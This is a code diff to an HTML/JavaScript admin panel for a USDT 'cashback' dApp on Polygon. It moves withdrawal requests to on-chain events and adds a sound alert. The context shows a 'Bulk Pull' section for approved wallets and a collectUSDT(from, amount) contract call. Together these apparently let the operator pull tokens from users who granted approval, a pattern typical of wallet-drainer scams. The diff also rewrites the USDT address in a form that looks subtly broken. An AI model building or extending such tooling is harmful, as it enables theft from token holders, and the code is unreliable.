@@ -11,7 +11,6 @@
 
     <div class="w-full max-w-xl space-y-6 pb-12">
         
-        <!-- Header & Connect Admin Wallet -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 flex items-center justify-between">
             <div class="flex items-center gap-2">
                 <h1 class="text-sm md:text-base font-bold text-emerald-400">USDT Advanced Admin Panel</h1>
@@ -23,7 +22,7 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
-        <!-- PART 0: Sub-Admin & Prefix Management (Owner Only) -->
+        <!-- PART 0 -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 🛡️ Sub-Admin & Prefix Management (Owner Only)
@@ -53,7 +52,7 @@
             </div>
         </div>
 
-        <!-- PART 1: Manage Cashback Tiered Rates -->
+        <!-- PART 1 -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 ⚙️ 1. Cashback Tiered Rates
@@ -74,7 +73,7 @@
             </div>
         </div>
 
-        <!-- PART 2: Approved Wallets Monitoring, Balance & Bulk Pull -->
+        <!-- PART 2 -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
@@ -112,18 +111,18 @@
             </div>
         </div>
 
-        <!-- PART 3: User Withdrawal Requests & Admin Direct Transfer -->
+        <!-- PART 3 -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
-                    📥 3. Withdrawal Requests & Direct Transfer
+                    📥 3. Withdrawal Requests (Blockchain Events)
                 </h2>
                 <button onclick="loadWithdrawRequests()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Load Requests</button>
             </div>
 
             <div class="space-y-2.5" id="withdrawRequestsContainer">
                 <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">
-                    စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။
+                    Admin Wallet ချိတ်ဆက်ပြီး Load Requests နှိပ်ပါ။
                 </div>
             </div>
         </div>
@@ -134,7 +133,7 @@
         let provider, adminSigner, adminAddress;
 
         const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; 
-        const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        const USDT_ADDRESS = "0XC2132D05D31C914A87C6611C10748AEB04B58E8F";
         const POLYGON_CHAIN_ID = "0x89";
 
         const ERC20_ABI = [
@@ -150,7 +149,8 @@
             "function subAdminPrefix(address) view returns (string)",
             "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
             "function collectUSDT(address from, uint256 amount) external",
-            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
+            "event WithdrawRequested(address indexed user, uint256 amount)"
         ];
 
         async function connectAdminWallet() {
@@ -174,7 +174,7 @@
                 document.getElementById("adminStatus").innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
                 
                 refreshUserTable();
-                loadWithdrawRequests();
+                initRealtimeWithdrawListener();
             } catch (err) {
                 console.error(err);
                 document.getElementById("adminStatus").innerText = "Admin Wallet ချိတ်ဆက်မှု သို့မဟုတ် Network ပြောင်းလဲမှု မအောင်မြင်ပါ။";
@@ -253,9 +253,6 @@
                 } catch (evErr) {
                     console.warn("Event query warning:", evErr);
                 }
-
-                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                savedUsers.forEach(addr => userSet.add(addr.toLowerCase()));
 
                 const allUsers = Array.from(userSet);
 
@@ -378,30 +375,61 @@
             refreshUserTable();
         }
 
-        // LocalStorage မှ Withdraw တောင်းဆိုချက်များကို ဖတ်ရှုပြသခြင်း
+        // Web Audio API Beep Alert for Admin
+        function playAlertSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch beep
+                gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                
+                oscillator.start();
+                oscillator.stop(audioCtx.currentTime + 0.3);
+            } catch (e) {
+                console.log("Audio play error:", e);
+            }
+        }
+
         async function loadWithdrawRequests() {
             const container = document.getElementById("withdrawRequestsContainer");
-            try {
-                let requests = JSON.parse(localStorage.getItem("dapp_withdrawal_requests") || "[]");
-                const pendingRequests = requests.filter(r => !r.processed);
+            if (!provider) {
+                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-amber-400 text-xs">ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။</div>`;
+                return;
+            }
 
-                if (!pendingRequests || pendingRequests.length === 0) {
+            container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-400 text-xs">Blockchain မှ တောင်းဆိုချက်များကို ရှာဖွေနေပါသည်...</div>`;
+
+            try {
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
+                const filter = contract.filters.WithdrawRequested();
+                const events = await contract.queryFilter(filter, 0, "latest");
+
+                if (!events || events.length === 0) {
                     container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
                     return;
                 }
 
                 let html = "";
-                pendingRequests.forEach(req => {
+                events.forEach((ev) => {
+                    const userAddr = ev.args[0];
+                    const amountBN = ev.args[1];
+                    const amountFormatted = ethers.formatUnits(amountBN, 6);
+
                     html += `
                         <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 flex items-center justify-between text-xs">
                             <div>
-                                <p class="font-mono text-slate-300">User: <span class="text-emerald-400">${req.user.substring(0,6)}...${req.user.substring(38)}</span></p>
-                                <p class="font-mono text-amber-300">Request Amount: ${req.amount} USDT</p>
-                                <p class="text-[10px] text-slate-500">${req.timestamp || ''}</p>
+                                <p class="font-mono text-slate-300">User: <span class="text-emerald-400">${userAddr.substring(0,6)}...${userAddr.substring(38)}</span></p>
+                                <p class="font-mono text-amber-300">Request Amount: ${amountFormatted} USDT</p>
+                                <p class="text-[10px] text-slate-500">Tx Hash: ${ev.transactionHash.substring(0,10)}...</p>
                             </div>
                             <div class="flex gap-2">
-                                <button onclick="handleWithdrawAction('${req.user}', ${req.id}, true)" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Transfer & Approve</button>
-                                <button onclick="handleWithdrawAction('${req.user}', ${req.id}, false)" class="bg-red-600 hover:bg-red-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Reject</button>
+                                <button onclick="handleTransferApprove('${userAddr}', '${amountFormatted}')" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Transfer & Approve</button>
                             </div>
                         </div>
                     `;
@@ -410,28 +438,34 @@
                 container.innerHTML = html;
             } catch (err) {
                 console.error(err);
-                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">Withdrawal တောင်းဆိုချက်များကို ဖတ်ရှု၍ မရပါ။</div>`;
+                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">တောင်းဆိုချက်များကို ဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။</div>`;
             }
         }
 
-        // Admin မှ Approve နှိပ်ပါက Admin Wallet မှ User ထံသို့ USDT တိုက်ရိုက်လွှဲပေးခြင်း
-        async function handleWithdrawAction(userAddr, requestId, approved) {
-            let requests = JSON.parse(localStorage.getItem("dapp_withdrawal_requests") || "[]");
-            const reqIndex = requests.findIndex(r => r.id === requestId);
-
-            if (!approved) {
-                if (reqIndex !== -1) {
-                    requests[reqIndex].processed = true;
-                    requests[reqIndex].status = 'Rejected';
-                    localStorage.setItem("dapp_withdrawal_requests", JSON.stringify(requests));
-                }
-                alert("Withdrawal တောင်းဆိုမှုကို ငြင်းပယ်လိုက်ပါပြီ။");
-                loadWithdrawRequests();
-                return;
-            }
+        // Real-time Withdraw Listener for Admin (Audio + Auto Refresh)
+        async function initRealtimeWithdrawListener() {
+            if (!provider) return;
 
             try {
-                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ (ဥပမာ - 10):", "10");
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
+                loadWithdrawRequests();
+
+                contract.on("WithdrawRequested", (userAddr, amountBN, event) => {
+                    const amountFormatted = ethers.formatUnits(amountBN, 6);
+                    playAlertSound();
+                    loadWithdrawRequests();
+                    alert(`🚨 Withdrawal တောင်းဆိုမှု အသစ်ရောက်ရှိလာပါပြီ!\nUser: ${userAddr.substring(0,6)}... (${amountFormatted} USDT)`);
+                });
+
+                document.getElementById("adminStatus").innerText += " | Real-time Event Listener Active (Online)";
+            } catch (err) {
+                console.error("Realtime listener error:", err);
+            }
+        }
+
+        async function handleTransferApprove(userAddr, defaultAmount) {
+            try {
+                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ:", defaultAmount);
                 if (!amountStr) return;
 
                 if (!adminSigner) {
@@ -444,12 +478,6 @@
                 
                 const tx = await usdtContract.transfer(userAddr, ethers.parseUnits(amountStr, 6));
                 await tx.wait();
-
-                if (reqIndex !== -1) {
-                    requests[reqIndex].processed = true;
-                    requests[reqIndex].status = 'Approved';
-                    localStorage.setItem("dapp_withdrawal_requests", JSON.stringify(requests));
-                }
 
                 alert("USDT များကို User ထံသို့ အောင်မြင်စွာ တိုက်ရိုက်လွှဲပြောင်းပြီးပါပြီ။");
                 loadWithdrawRequests();
